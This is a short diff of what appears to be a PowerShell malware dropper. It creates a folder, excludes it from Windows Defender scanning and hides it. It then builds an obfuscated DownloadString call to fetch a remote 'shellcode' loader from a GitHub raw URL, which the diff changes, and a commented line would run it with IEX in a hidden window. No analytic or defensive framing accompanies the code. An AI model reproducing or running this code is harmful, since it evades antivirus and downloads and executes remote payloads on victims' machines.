@@ -70,7 +70,7 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Mewing")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 # Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
